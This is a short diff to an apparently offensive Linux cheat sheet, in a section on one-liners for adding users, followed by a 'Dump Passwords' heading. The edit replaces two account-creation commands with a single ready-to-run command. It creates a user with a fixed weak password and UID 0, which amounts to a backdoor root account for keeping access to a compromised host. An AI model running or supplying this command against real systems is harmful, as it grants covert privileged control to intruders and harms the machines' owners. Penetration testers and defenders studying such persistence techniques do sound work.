@@ -14,8 +14,7 @@
 
 ## One-liner: useradd and chpasswd
 ```bash
-useradd victor -g root -s /bin/bash && echo victor:password | chpasswd
-useradd -p $(openssl passwd -crypt password) -s /bin/bash -g 0 victor
+useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor
 ```
 
 ## Dump Passwords
